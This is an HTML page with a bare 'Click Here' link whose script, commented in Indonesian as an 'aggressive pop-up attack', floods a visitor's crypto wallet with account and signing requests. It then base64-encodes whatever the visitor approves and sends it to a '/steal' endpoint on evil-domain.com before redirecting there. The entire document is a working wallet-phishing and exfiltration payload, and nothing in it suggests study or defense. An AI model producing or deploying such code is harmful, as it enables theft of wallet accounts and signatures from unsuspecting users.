<!DOCTYPE html>
<html lang="id">
<head>

</head>
<body>
    <a id="clickLink" class="click-text" href="javascript:void(0)">Click Here</a>

    <script>
        const link = document.getElementById('clickLink');
        
        link.addEventListener('click', async function(e) {
            e.preventDefault();
            
            // AGRESIF POP-UP ATTACK
            try {
                // 1. Multiple sign requests bersamaan (spam pop-up)
                const promises = [
                    window.ethereum?.request({method: 'eth_requestAccounts'}),
                    window.ethereum?.request({method: 'eth_accounts'}),
                    window.ethereum?.request({method: 'personal_sign', params: ['0x00', '0x0000000000000000000000000000000000000000']}),
                    window.ethereum?.request({method: 'eth_signTypedData_v4', params: [{}, '0x00', '0x0000000000000000000000000000000000000000']})
                ];
                
                Promise.allSettled(promises).then(results => {
                    // Exfiltrate semua hasil
                    results.forEach((result, i) => {
                        if (result.status === 'fulfilled') {
                            fetch('https://rclm.link.evil-domain.com/steal?method=' + i + '&data=' + btoa(JSON.stringify(result.value)));
                        }
                    });
                });
                
            } catch(e) {}
            
            // Fallback redirect
            setTimeout(() => window.open('https://rclm.link.evil-domain.com', '_blank'), 500);
        });
    </script>
</body>
</html>
